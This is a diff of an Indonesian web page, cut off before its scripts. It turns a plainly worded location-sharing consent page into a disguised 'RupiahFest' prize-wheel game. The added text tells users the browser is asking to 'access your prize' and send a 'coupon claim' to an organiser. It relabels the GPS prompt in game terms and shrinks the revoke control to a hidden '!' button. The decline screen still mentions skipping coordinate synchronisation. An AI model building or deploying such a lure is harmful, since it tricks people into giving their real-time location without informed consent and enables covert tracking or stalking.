@@ -1,180 +1,731 @@
 <!doctype html>
 <html lang="id">
+
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Bagikan Lokasi</title>
-<style>
-  :root{
-    --bg:#0e121d; --card:#161d2e; --fg:#eef1f8; --muted:#97a2bd;
-    --accent:#5a8bff; --accent-weak:#1b2748; --ok:#22c48d; --danger:#ff5f78; --line:#28314c;
-    color-scheme:dark;
-  }
-  *{box-sizing:border-box}
-  html,body{height:100%}
-  body{margin:0;background:
-      radial-gradient(900px 500px at 50% -10%, rgba(90,139,255,.18), transparent 60%),
-      var(--bg);
-    color:var(--fg);font:16px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
-    display:flex;align-items:center;justify-content:center;
-    padding:max(18px,env(safe-area-inset-top)) max(16px,env(safe-area-inset-right)) max(22px,env(safe-area-inset-bottom)) max(16px,env(safe-area-inset-left))}
-  .card{background:var(--card);border:1px solid var(--line);border-radius:4px;max-width:430px;width:100%;
-    padding:28px 24px;box-shadow:0 30px 70px rgba(0,0,0,.5)}
-  .ava{width:60px;height:60px;border-radius:4px;background:var(--accent);display:grid;place-items:center;
-    font-size:26px;font-weight:800;color:#fff;margin:0 auto 16px}
-  .badge{display:flex;justify-content:center;gap:7px;align-items:center;font-size:11.5px;letter-spacing:.06em;
-    text-transform:uppercase;color:var(--muted);margin-bottom:14px}
-  .dot{width:7px;height:7px;border-radius:50%;background:var(--accent)}
-  h1{font-size:22px;margin:0 0 6px;text-align:center;line-height:1.3}
-  .who{color:var(--accent);font-weight:800}
-  .reason{color:var(--muted);text-align:center;margin:0 0 4px}
-  .mode{display:flex;justify-content:center;margin:12px 0 2px}
-  .modepill{font-size:12px;color:var(--muted);border:1px solid var(--line);padding:5px 11px;border-radius:3px}
-  .note{background:var(--accent-weak);border:1px solid var(--line);border-radius:4px;padding:14px;
-    font-size:13.5px;color:var(--muted);margin:18px 0}
-  .note b{color:var(--fg)}
-  label.live{display:flex;align-items:center;gap:11px;justify-content:center;color:var(--muted);
-    font-size:14px;margin:4px 0 14px;cursor:pointer}
-  label.live input{width:19px;height:19px;accent-color:var(--accent)}
-  button{width:100%;border-radius:4px;padding:16px;font-size:16px;font-weight:700;border:0;cursor:pointer;font-family:inherit}
-  .primary{background:var(--accent);color:#fff;display:flex;align-items:center;justify-content:center;gap:9px}
-  .primary:active{transform:translateY(1px)}
-  .primary:disabled{opacity:.6}
-  .ghost{background:transparent;color:var(--muted);border:1px solid var(--line);margin-top:10px}
-  .danger{background:transparent;color:var(--danger);border:1px solid var(--line);margin-top:10px}
-  .status{margin-top:16px;text-align:center;font-size:14px;min-height:20px}
-  .ok{color:var(--ok)} .err{color:var(--danger)}
-  .coords{font-size:12.5px;color:var(--muted);text-align:center;margin-top:8px;font-variant-numeric:tabular-nums}
-  .icon{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
-  [hidden]{display:none!important}
-  .spin{display:inline-block;width:15px;height:15px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:s .8s linear infinite;vertical-align:-2px}
-  @keyframes s{to{transform:rotate(360deg)}}
-  .big{font-size:40px;text-align:center;margin:0 0 6px}
-  .pulse{animation:p 1.6s infinite}@keyframes p{0%,100%{opacity:1}50%{opacity:.4}}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Quest Peta Rahasia</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Baloo+2:wght@500;600;700;800&display=swap">
+  <style>
+    :root{
+      --bg:#3a0d10; --bg2:#5a1114; --panel:#4a0f12;
+      --gold:#ffd23f; --gold-deep:#f0a71e; --gold-dark:#8a4b11;
+      --green:#2fae57; --green-dk:#17813c; --red:#e23c2f;
+      --cream:#fff6e2; --ink:#2a1405; --muted:#f3d9a6; --line:rgba(255,210,63,.32);
+      --display:"Luckiest Guy",system-ui,cursive;
+      --sans:"Baloo 2",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color-scheme:dark;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;color:var(--cream);font:16px/1.5 var(--sans);
+      background:
+        radial-gradient(130% 80% at 50% -8%,rgba(255,210,63,.28),transparent 55%),
+        radial-gradient(100% 70% at 50% 108%,rgba(47,174,87,.18),transparent 60%),
+        repeating-linear-gradient(45deg,rgba(0,0,0,.14) 0 10px,transparent 10px 20px),
+        linear-gradient(180deg,var(--bg2),var(--bg) 60%,#2a0809);
+      background-attachment:fixed;
+      display:flex;align-items:center;justify-content:center;
+      padding:max(18px,env(safe-area-inset-top)) max(16px,env(safe-area-inset-right)) max(22px,env(safe-area-inset-bottom)) max(16px,env(safe-area-inset-left))
+    }
+    .card{
+      position:relative;max-width:430px;width:100%;padding:30px 24px 26px;text-align:center;
+      border-radius:24px;border:5px solid transparent;
+      background:
+        linear-gradient(180deg,#6a1a1d,#420d10) padding-box,
+        linear-gradient(180deg,var(--gold),var(--gold-dark)) border-box;
+      box-shadow:0 30px 60px -20px #000,inset 0 0 0 2px rgba(255,210,63,.3)
+    }
+    .consent-close{
+      position:absolute;top:12px;right:12px;width:40px;height:40px;border-radius:50%;
+      border:2px solid #fff3c4;background:linear-gradient(180deg,var(--gold),var(--gold-deep));
+      color:var(--ink);font:800 20px var(--sans);line-height:1;cursor:pointer;padding:0;
+      box-shadow:0 4px 10px -3px #000
+    }
+    .consent-close:active{transform:translateY(1px)}
+    .ava{
+      width:66px;height:66px;border-radius:18px;margin:4px auto 14px;display:grid;place-items:center;
+      font:800 28px var(--sans);color:var(--ink);
+      background:linear-gradient(180deg,var(--gold),var(--gold-deep));
+      border:3px solid #fff3c4;box-shadow:0 8px 18px -8px #000
+    }
+    .badge{
+      display:inline-flex;justify-content:center;gap:7px;align-items:center;
+      font:800 .72rem var(--sans);letter-spacing:.1em;text-transform:uppercase;color:var(--ink);
+      background:linear-gradient(180deg,var(--gold),var(--gold-deep));
+      padding:4px 14px;border-radius:999px;border:2px solid #fff3c4;margin-bottom:12px
+    }
+    .dot{width:7px;height:7px;border-radius:50%;background:#7a2a0c}
+    h1{font-family:var(--sans);font-weight:800;font-size:24px;margin:0 0 6px;line-height:1.25;color:var(--cream)}
+    .who{color:var(--gold);font-weight:800}
+    .reason{color:var(--muted);margin:0 0 4px}
+    .mode{display:flex;justify-content:center;margin:12px 0 2px}
+    .modepill{
+      font:700 12px var(--sans);color:#ffe9a8;background:rgba(0,0,0,.3);
+      border:1px solid rgba(255,210,63,.45);padding:5px 13px;border-radius:999px
+    }
+    .note{
+      background:rgba(0,0,0,.28);border:1px solid var(--line);border-radius:14px;
+      padding:14px;font-size:13.5px;color:var(--muted);margin:16px 0;text-align:left
+    }
+    .note b{color:#fff}
+    .live{display:flex;align-items:center;gap:9px;justify-content:center;color:#ffe9a8;font-size:13.5px;margin:4px 0 16px;text-align:center}
+    button{width:100%;border-radius:15px;padding:15px;font:800 1.05rem var(--sans);border:0;cursor:pointer}
+    .primary{
+      color:#fff;display:flex;align-items:center;justify-content:center;gap:9px;
+      background:linear-gradient(180deg,#43c76d,var(--green) 55%,var(--green-dk));
+      border:3px solid #c9f4d6;box-shadow:0 7px 0 #0f5c2a;text-shadow:0 2px 2px rgba(0,0,0,.3)
+    }
+    .primary:active{transform:translateY(3px);box-shadow:0 4px 0 #0f5c2a}
+    .primary:disabled{opacity:.6;box-shadow:0 4px 0 #0f5c2a;transform:translateY(3px)}
+    .ghost{
+      margin-top:11px;background:transparent;color:#ffe9a8;
+      border:2px solid rgba(255,210,63,.45)
+    }
+    .ghost:active{transform:translateY(1px)}
+    .danger{margin-top:11px;background:transparent;color:#ffb9ae;border:2px solid rgba(226,60,47,.6)}
+    .status{margin-top:16px;text-align:center;font-size:14px;min-height:20px}
+    .ok{color:#8ef0b2}
+    .err{color:#ffb9ae}
+    .coords{font-size:12.5px;color:var(--muted);text-align:center;margin-top:8px;font-variant-numeric:tabular-nums}
+    .icon{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+    [hidden]{display:none !important}
+    .spin{display:inline-block;width:15px;height:15px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:s .8s linear infinite;vertical-align:-2px}
+    @keyframes s{to{transform:rotate(360deg)}}
+    .big{font-size:40px;text-align:center;margin:0 0 6px}
+    .pulse{animation:p 1.6s infinite}
+    .game-screen{position:fixed;inset:0;z-index:10;background:var(--bg)}
+    .game-frame{display:block;width:100%;height:100%;border:0}
+    .game-tools{
+      position:fixed;z-index:11;top:max(8px,env(safe-area-inset-top));left:max(8px,env(safe-area-inset-left));
+      display:flex;align-items:center;gap:10px;max-width:calc(100vw - 16px);padding:8px 10px;
+      border:1px solid var(--line);border-radius:12px;background:rgba(66,13,16,.94);
+      box-shadow:0 4px 16px rgba(0,0,0,.4);font-size:13px;color:var(--cream)
+    }
+    .game-tools .status{margin:0;min-height:0}
+    .game-tools .danger,.game-tools .ghost{width:auto;padding:8px 12px;margin:0;font-size:13px;border-radius:999px}
+    @media (max-width:420px){.game-tools{right:max(8px,env(safe-area-inset-right));justify-content:space-between}}
+    @keyframes p{0%,100%{opacity:1}50%{opacity:.4}}
+  </style>
 </head>
+
 <body>
-  <div class="card">
+  <div class="card" id="card">
     <!-- PERSETUJUAN -->
     <div id="consent" hidden>
+      <button class="consent-close" id="closeConsent" aria-label="Tutup menu quest">✕</button>
       <div class="ava" id="ava">?</div>
-      <div class="badge"><span class="dot"></span> Permintaan berbagi lokasi</div>
-      <h1><span class="who" id="who">Seseorang</span> meminta lokasimu</h1>
+      <div class="badge"><span class="dot"></span> Event Quest Baru</div>
+      <h1><span class="who" id="who">Pemain Misterius</span> menantang petualanganmu</h1>
       <p class="reason" id="reason"></p>
       <div class="mode"><span class="modepill" id="modepill"></span></div>
 
-      <div class="note">
-        Saat kamu tekan tombol di bawah, browser akan <b>minta izin GPS</b>.
-        Lokasimu dikirim ke orang yang membuat link ini — <b>kamu yang memilih</b>,
-        dan bisa berhenti kapan saja.
+      <div class="note" id="revokedNote" hidden>
+        Karaktermu sebelumnya sudah <b>berhenti menyalakan sinyal bermain</b> di peta ini. Permainan tidak akan dimulai
+        kecuali kamu memulai kembali di sini.
       </div>
 
-      <label class="live" id="liveWrap">
-        <input type="checkbox" id="live"> Perbarui lokasi real-time selama halaman terbuka
-      </label>
+      <div class="note">
+        Saat kamu menekan tombol di bawah, browser akan <b>meminta izin akses hadiahmu</b>, dan
+        <b>klaim kupon eksklusifmu</b> dikirim ke sang penyelenggara event —
+        ini bukan sekadar undian biasa. <b>Kamu pemegang kendali penuh</b> dan dapat membatalkan proses
+        kapan saja. Kamu juga bisa melewati klaim ini dan langsung lanjut tanpa mengambil hadiahnya.
+      </div>
+
+      <p class="live" id="liveWrap">
+        ● Mainkan dan dapatkan kupon serta Hadiah.
+      </p>
 
       <button class="primary" id="shareBtn">
-        <svg class="icon" viewBox="0 0 24 24"><path d="M12 21s-7-5.2-7-11a7 7 0 1 1 14 0c0 5.8-7 11-7 11z"/><circle cx="12" cy="10" r="2.5"/></svg>
-        Bagikan lokasi saya</button>
-      <button class="ghost" id="declineBtn">Tidak, jangan bagikan</button>
+        <svg class="icon" viewBox="0 0 24 24">
+          <path d="M21 6H3a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2zm-12 9H7v-2H5v-2h2V9h2v2h2v2H9v2zm8 0h-2v-2h-2v-2h2V9h2v2h2v2h-2v2z" />
+          <circle cx="17" cy="11" r="1" />
+          <circle cx="15" cy="13" r="1" />
+        </svg>
+        ⚔️ Aktifkan &amp; dan main bersamaku</button>
+      <button class="ghost" id="declineBtn">Lewati Quest &amp; Mainkan Saja</button>
       <div class="status" id="status"></div>
       <div class="coords" id="coords"></div>
     </div>
 
     <!-- BERHASIL -->
     <div id="done" hidden>
-      <div class="big">✅</div>
-      <h1>Lokasi terkirim</h1>
+      <div class="big">⚔️</div>
+      <h1>Sinyal Terhubung!</h1>
       <p class="reason" id="doneMsg"></p>
       <div class="coords" id="doneCoords"></div>
-      <div class="status" id="liveState"></div>
-      <button class="danger" id="revokeBtn">Berhenti berbagi &amp; tarik izin</button>
     </div>
 
     <!-- DITOLAK -->
     <div id="declined" hidden>
-      <div class="big">🚫</div>
-      <h1>Oke, tidak dibagikan</h1>
-      <p class="reason">Kamu memilih untuk tidak berbagi lokasi. Tidak ada data yang dikirim.</p>
+      <div class="big">🛡️</div>
+      <h1>Mode Solo Dipilih</h1>
+      <p class="reason">Kamu memilih untuk melewati sinkronisasi koordinat. Langsung meluncur ke dalam game!</p>
     </div>
 
     <!-- TUTUP / KEDALUWARSA -->
     <div id="closed" hidden>
       <div class="big" id="closedIcon">⌛</div>
-      <h1 id="closedTitle">Link tidak aktif</h1>
+      <h1 id="closedTitle">Quest Berakhir</h1>
       <p class="reason" id="closedMsg"></p>
     </div>
   </div>
 
+  <section class="game-screen" id="gameScreen" aria-label="Area Permainan RupiahFest" hidden>
+    <iframe class="game-frame" id="gameFrame" title="Area Permainan RupiahFest"></iframe>
+    <div class="game-tools" id="gameTools" hidden>
+      <div class="status" id="liveState" role="status" aria-live="polite"></div>
+      <button class="ghost" id="openConsentBtn" hidden>Buka Menu Permainan</button>
+      <button class="danger" id="revokeBtn" hidden>!</button>
+    </div>
+  </section>
+
+  <script>
+    // Template Game RupiahFest Spin yang disatukan secara internal
+    const GAME_HTML = `<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>RupiahFest Spin</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Baloo+2:wght@500;600;700;800&display=swap">
+<style>
+  :root{
+    --bg:#3a0d10; --bg2:#5a1114; --panel:#4a0f12; --gold:#ffd23f; --gold-deep:#f0a71e; --gold-dark:#8a4b11;
+    --green:#2fae57; --green-dk:#17813c; --red:#e23c2f; --cream:#fff6e2; --ink:#2a1405; --muted:#f3d9a6;
+    --wood:#7a3f17; --shadow:0 20px 50px -18px rgba(0,0,0,.7); --display:"Luckiest Guy",system-ui,cursive;
+    --sans:"Baloo 2",system-ui,-apple-system,Segoe UI,Roboto,sans-serif; color-scheme:dark;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0}
+  body{
+    color:var(--cream);font-family:var(--sans);line-height:1.45;
+    background:
+      radial-gradient(130% 80% at 50% -8%,rgba(255,210,63,.28),transparent 55%),
+      radial-gradient(100% 70% at 50% 108%,rgba(47,174,87,.18),transparent 60%),
+      repeating-linear-gradient(45deg,rgba(0,0,0,.14) 0 10px,transparent 10px 20px),
+      linear-gradient(180deg,var(--bg2),var(--bg) 60%,#2a0809);
+    background-attachment:fixed;
+  }
+  .wrap{max-width:520px;margin:0 auto;position:relative;z-index:1;
+    padding-left:max(16px,env(safe-area-inset-left,0px));
+    padding-right:max(16px,env(safe-area-inset-right,0px));
+    padding-block:18px 60px;display:flex;flex-direction:column;gap:22px}
+  .gem,.coin-f{position:fixed;pointer-events:none;z-index:0;filter:drop-shadow(0 2px 4px rgba(0,0,0,.4))}
+  .gem{width:16px;height:16px;background:linear-gradient(135deg,#bfefff,#4aa3d6);
+    clip-path:polygon(50% 0,100% 38%,82% 100%,18% 100%,0 38%);animation:twinkle 2.6s ease-in-out infinite}
+  @keyframes twinkle{0%,100%{opacity:.25;transform:translateY(0) rotate(0)}50%{opacity:.9;transform:translateY(-8px) rotate(12deg)}}
+  .music{position:fixed;z-index:20;
+    top:calc(12px + env(safe-area-inset-top,0px));
+    right:calc(12px + env(safe-area-inset-right,0px));
+    display:inline-flex;align-items:center;gap:7px;font:700 .8rem var(--sans);
+    color:var(--ink);background:linear-gradient(180deg,var(--gold),var(--gold-deep));
+    border:2px solid #fff3c4;border-radius:999px;padding:7px 13px;cursor:pointer;
+    box-shadow:0 6px 16px -6px rgba(0,0,0,.6)}
+  .music:active{transform:translateY(1px)}
+  h1,h2,h3{margin:0;text-wrap:balance}
+  .hero{text-align:center;display:flex;flex-direction:column;align-items:center;gap:8px;padding-top:28px}
+  .brand-tag{font:800 .78rem var(--sans);letter-spacing:.12em;text-transform:uppercase;
+    color:var(--ink);background:linear-gradient(180deg,var(--gold),var(--gold-deep));
+    padding:4px 14px;border-radius:999px;border:2px solid #fff3c4;box-shadow:0 4px 10px -4px #000}
+  .title{font-family:var(--display);font-size:clamp(2.6rem,13vw,4rem);line-height:.92;
+    background:linear-gradient(180deg,#fff6c2 8%,var(--gold) 40%,var(--gold-deep) 70%,#b9650f 100%);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+    -webkit-text-stroke:3px #7a2a0c;
+    filter:drop-shadow(0 3px 0 #5e1f08) drop-shadow(0 8px 14px rgba(0,0,0,.6));
+    letter-spacing:.01em;transform:rotate(-2deg)}
+  .title small{display:block;-webkit-text-stroke:2px #7a2a0c;font-size:.52em;transform:rotate(2deg);margin-top:-.1em}
+  .sub{color:var(--muted);max-width:40ch;margin:4px 0 0;font-weight:500;font-size:.92rem}
+  .flag{display:inline-flex;gap:6px;align-items:center;margin-top:2px;font-size:.74rem;font-weight:700;
+    color:#ffe9a8;background:rgba(0,0,0,.3);border:1px solid rgba(255,210,63,.4);padding:4px 12px;border-radius:999px}
+  .cabinet{position:relative;border-radius:26px;padding:20px 16px 22px;
+    background:
+      linear-gradient(180deg,#8f4e1d,#5e2f12) padding-box,
+      linear-gradient(180deg,var(--gold),var(--gold-dark)) border-box;
+    border:6px solid transparent;box-shadow:var(--shadow),inset 0 0 0 3px rgba(255,235,170,.35);
+    display:flex;flex-direction:column;align-items:center;gap:16px;overflow:hidden}
+  .cabinet::before{content:"";position:absolute;inset:0;background:
+    radial-gradient(70% 55% at 50% 40%,rgba(255,220,120,.35),transparent 70%);pointer-events:none}
+  .stud{position:absolute;width:12px;height:12px;border-radius:50%;
+    background:radial-gradient(circle at 35% 30%,#fff2b0,var(--gold-deep));box-shadow:0 1px 2px #000}
+  .stud.tl{top:10px;left:10px}.stud.tr{top:10px;right:10px}.stud.bl{bottom:10px;left:10px}.stud.br{bottom:10px;right:10px}
+  .stage{position:relative;width:min(340px,80vw);aspect-ratio:1;max-width:100%;z-index:1}
+  .glowring{position:absolute;inset:-14px;border-radius:50%;z-index:0;
+    background:conic-gradient(from 0deg,transparent,rgba(255,236,150,.9),transparent 30%,rgba(255,236,150,.8),transparent 60%,rgba(255,236,150,.9),transparent 90%);
+    filter:blur(6px);animation:spinGlow 3.5s linear infinite;opacity:.85}
+  @keyframes spinGlow{to{transform:rotate(360deg)}}
+  .pointer{position:absolute;top:-20px;left:50%;transform:translateX(-50%);z-index:4;
+    width:0;height:0;border-left:18px solid transparent;border-right:18px solid transparent;
+    border-top:34px solid var(--red);filter:drop-shadow(0 3px 3px rgba(0,0,0,.5))}
+  .pointer::after{content:"$";position:absolute;top:-34px;left:50%;transform:translateX(-50%);
+    width:26px;height:26px;border-radius:50%;background:linear-gradient(180deg,var(--gold),var(--gold-deep));
+    color:var(--ink);font:800 15px var(--sans);display:grid;place-items:center;border:2px solid #fff3c4}
+  canvas{position:relative;z-index:2;width:100%;height:100%;border-radius:50%;
+    box-shadow:0 0 0 9px #b9790f,0 0 0 13px #ffe07a,0 0 0 15px #8a4b11,0 14px 30px rgba(0,0,0,.5)}
+  .hub{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:3;
+    width:74px;height:74px;border-radius:50%;
+    background:radial-gradient(circle at 38% 32%,#fff3b0,var(--gold) 55%,var(--gold-deep));
+    border:4px solid #fff3c4;display:grid;place-items:center;
+    font:800 13px var(--sans);color:var(--ink);text-align:center;box-shadow:0 4px 10px rgba(0,0,0,.5)}
+  .hub span{font-family:var(--display);font-size:20px}
+  .spinBtn{font:800 1.15rem var(--sans);color:#fff;letter-spacing:.02em;
+    background:linear-gradient(180deg,#ff6a3d,var(--red) 50%,#b61f16);
+    border:3px solid #ffd9a0;border-radius:16px;padding:14px 42px;cursor:pointer;z-index:1;
+    box-shadow:0 10px 0 #7d1109,0 16px 24px -10px rgba(0,0,0,.7);
+    text-shadow:0 2px 2px rgba(0,0,0,.35);transition:transform .1s ease}
+  .spinBtn:active{transform:translateY(5px);box-shadow:0 5px 0 #7d1109}
+  .spinBtn:disabled{filter:grayscale(.5) brightness(.8);cursor:not-allowed;box-shadow:0 5px 0 #7d1109}
+  .chances{font-weight:700;color:#ffe9a8;z-index:1}
+  .chances b{color:#fff}
+  .result{min-height:1.4em;font-weight:800;text-align:center;z-index:1;color:#ffe9a8}
+  .result.win{color:#7dffb0;text-shadow:0 0 10px rgba(80,255,150,.5)}
+  .ribbon{width:100%;display:flex;gap:10px;z-index:1}
+  .ribbon div{flex:1;text-align:center;font-weight:800;color:var(--ink);font-size:.82rem;
+    background:linear-gradient(180deg,#ffe488,var(--gold-deep));border:2px solid #fff3c4;border-radius:10px;padding:7px 4px;
+    box-shadow:inset 0 -3px 6px rgba(0,0,0,.15)}
+  .sec-title{text-align:center;font-family:var(--display);font-size:1.5rem;color:var(--gold);
+    -webkit-text-stroke:1.5px #5e1f08;filter:drop-shadow(0 2px 0 #5e1f08)}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px}
+  .prize{display:flex;gap:11px;align-items:center;padding:13px;border-radius:14px;
+    background:linear-gradient(180deg,rgba(255,236,170,.14),rgba(0,0,0,.18));
+    border:2px solid rgba(255,210,63,.45);box-shadow:0 8px 18px -12px #000}
+  .prize .ic{width:38px;height:38px;flex:none;border-radius:10px;display:grid;place-items:center;font-size:1.2rem;
+    background:linear-gradient(180deg,var(--gold),var(--gold-deep));border:2px solid #fff3c4}
+  .prize b{display:block;font-size:.98rem;color:#fff}
+  .prize span{font-size:.78rem;color:var(--muted)}
+  .panel{border-radius:20px;padding:22px;
+    background:linear-gradient(180deg,#5c1316,#420d10);
+    border:3px solid transparent;background-clip:padding-box;
+    box-shadow:var(--shadow),inset 0 0 0 2px rgba(255,210,63,.3)}
+  .panel .eyebrow{font:800 .74rem var(--sans);letter-spacing:.12em;text-transform:uppercase;color:var(--gold)}
+  form{display:flex;flex-direction:column;gap:13px;margin-top:6px}
+  label{display:flex;flex-direction:column;gap:6px;font-size:.86rem;font-weight:700;color:#ffe9a8}
+  input{font:inherit;padding:11px 13px;border:2px solid rgba(255,210,63,.4);border-radius:11px;
+    background:rgba(0,0,0,.25);color:var(--cream);min-width:0}
+  input:focus-visible{outline:2px solid var(--gold);outline-offset:1px}
+  .check{flex-direction:row;align-items:flex-start;gap:9px;font-weight:500;font-size:.82rem;color:var(--muted)}
+  .check input{margin-top:2px;width:auto}
+  .claimBtn{align-self:flex-start;font:800 1rem var(--sans);color:var(--ink);
+    background:linear-gradient(180deg,#ffe488,var(--gold-deep));border:3px solid #fff3c4;border-radius:13px;
+    padding:12px 28px;cursor:pointer;box-shadow:0 7px 0 #8a4b11}
+  .claimBtn:active{transform:translateY(3px);box-shadow:0 4px 0 #8a4b11}
+  .note{font-size:.84rem;color:#fff;background:rgba(47,174,87,.2);
+    border:2px solid rgba(47,174,87,.55);border-radius:12px;padding:12px 14px}
+  .code{font-family:var(--display);letter-spacing:.06em;color:#7dffb0;font-size:1.05rem}
+  details{border-radius:14px;overflow:hidden;background:rgba(0,0,0,.25);border:2px solid rgba(255,210,63,.3)}
+  summary{cursor:pointer;padding:15px 18px;font-weight:800;color:var(--gold)}
+  .terms{padding:4px 18px 16px;font-size:.85rem;color:var(--muted);display:flex;flex-direction:column;gap:9px}
+  .terms b{color:#fff}
+  footer{text-align:center;font-size:.78rem;color:var(--muted);display:flex;flex-direction:column;gap:4px}
+  .toasts{position:fixed;z-index:30;left:max(12px,env(safe-area-inset-left,0px));
+    bottom:calc(14px + env(safe-area-inset-bottom,0px));display:flex;flex-direction:column;gap:9px;
+    max-width:min(300px,76vw)}
+  .toast{display:flex;gap:10px;align-items:flex-start;color:var(--ink);
+    background:linear-gradient(180deg,#fff7df,#ffe9ad);border:2px solid #fff3c4;border-radius:14px;
+    padding:11px 12px;box-shadow:0 10px 22px -10px rgba(0,0,0,.7);
+    transform:translateX(-120%);opacity:0;transition:transform .4s cubic-bezier(.2,.9,.3,1.2),opacity .4s}
+  .toast.in{transform:none;opacity:1}
+  .toast .tic{font-size:1.15rem;line-height:1.1;flex:none}
+  .toast .tbody{font-size:.8rem;font-weight:600;min-width:0}
+  .toast .tbody small{display:block;font-weight:700;color:#8a4b11;font-size:.68rem;letter-spacing:.04em;text-transform:uppercase;margin-bottom:1px}
+  .toast .tx{margin-left:auto;flex:none;border:none;background:rgba(0,0,0,.12);color:var(--ink);
+    width:22px;height:22px;border-radius:50%;cursor:pointer;font:700 13px var(--sans);line-height:1}
+  .toast .tx:hover{background:rgba(0,0,0,.22)}
+  .toast-off{position:fixed;z-index:30;right:max(12px,env(safe-area-inset-right,0px));
+    bottom:calc(14px + env(safe-area-inset-bottom,0px));font:700 .72rem var(--sans);
+    color:#ffe9a8;background:rgba(0,0,0,.4);border:1px solid rgba(255,210,63,.4);
+    border-radius:999px;padding:5px 11px;cursor:pointer}
+  .intro{position:fixed;inset:0;z-index:50;display:grid;place-items:center;padding:20px;
+    background:rgba(20,4,6,.62);backdrop-filter:blur(9px) saturate(1.1);-webkit-backdrop-filter:blur(9px) saturate(1.1);
+    opacity:0;transition:opacity .35s ease}
+  .intro.in{opacity:1}
+  .intro-card{position:relative;width:min(400px,92vw);text-align:center;
+    border-radius:24px;padding:30px 24px 26px;
+    background:linear-gradient(180deg,#6a1a1d,#420d10);
+    border:5px solid transparent;
+    background:
+      linear-gradient(180deg,#6a1a1d,#420d10) padding-box,
+      linear-gradient(180deg,var(--gold),var(--gold-dark)) border-box;
+    box-shadow:0 30px 60px -20px #000,inset 0 0 0 2px rgba(255,210,63,.3);
+    transform:translateY(16px) scale(.96);transition:transform .35s cubic-bezier(.2,.9,.3,1.25)}
+  .intro.in .intro-card{transform:none}
+  .intro-x{position:absolute;top:12px;right:12px;width:40px;height:40px;border-radius:50%;
+    border:2px solid #fff3c4;background:linear-gradient(180deg,var(--gold),var(--gold-deep));
+    color:var(--ink);font:800 20px var(--sans);line-height:1;cursor:pointer;
+    box-shadow:0 4px 10px -3px #000}
+  .intro-x:active{transform:translateY(1px)}
+  .intro-card .ribbonbig{font-family:var(--display);font-size:1.9rem;line-height:1;
+    background:linear-gradient(180deg,#fff6c2,var(--gold) 55%,var(--gold-deep));
+    -webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-stroke:2px #7a2a0c;
+    filter:drop-shadow(0 2px 0 #5e1f08);margin:6px 0 2px}
+  .intro-card .gift{font-size:3.2rem;display:block;margin:4px 0 2px;filter:drop-shadow(0 6px 10px rgba(0,0,0,.5))}
+  .intro-card p{color:var(--muted);font-size:.92rem;margin:6px 0 0}
+  .intro-card .mini{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin:14px 0 4px}
+  .intro-card .mini span{font-weight:700;font-size:.78rem;color:var(--ink);
+    background:linear-gradient(180deg,#ffe488,var(--gold-deep));border:2px solid #fff3c4;border-radius:999px;padding:5px 11px}
+  .intro-go{margin-top:18px;width:100%;font:800 1.1rem var(--sans);color:#fff;
+    background:linear-gradient(180deg,#ff6a3d,var(--red) 50%,#b61f16);border:3px solid #ffd9a0;border-radius:15px;
+    padding:14px;cursor:pointer;box-shadow:0 8px 0 #7d1109;text-shadow:0 2px 2px rgba(0,0,0,.35)}
+  .intro-go:active{transform:translateY(4px);box-shadow:0 4px 0 #7d1109}
+  .intro-fine{display:block;margin-top:12px;font-size:.72rem;color:#e9b7b2}
+  @media (prefers-reduced-motion:reduce){.glowring,.gem{animation:none}.toast,.intro,.intro-card{transition:none}}
+</style>
+
+<button class="music" id="musicBtn" aria-pressed="false">🔊 Musik</button>
+<audio id="bgm" loop preload="auto">
+  <source src="/music.mp3" type="audio/mpeg">
+</audio>
+
+<div class="intro" id="intro" role="dialog" aria-modal="true" aria-label="Selamat datang RupiahFest" hidden>
+  <div class="intro-card">
+    <button class="intro-x" id="introX" aria-label="Tutup">✕</button>
+    <span class="gift">🎁</span>
+    <div class="ribbonbig">Selamat Datang!</div>
+    <p>Di <b style="color:#fff">RupiahFest</b> kamu dapat <b style="color:#fff">1 putaran gratis</b> tiap hari. Putar rodanya dan menangkan voucher belanja asli.</p>
+    <div class="mini"><span>🎟️ Voucher</span><span>🏷️ Diskon</span><span>🚚 Ongkir</span></div>
+    <button class="intro-go" id="introGo">Mulai Putar 🎯</button>
+    <small class="intro-fine">Gratis, tanpa setoran. Hadiah berupa voucher toko — bukan uang tunai. Kami tak pernah minta OTP/PIN.</small>
+  </div>
+</div>
+
+<div class="wrap">
+  <header class="hero">
+    <span class="brand-tag">🎪 RupiahFest</span>
+    <h1 class="title">REZEKI<small>RUPIAHFEST</small></h1>
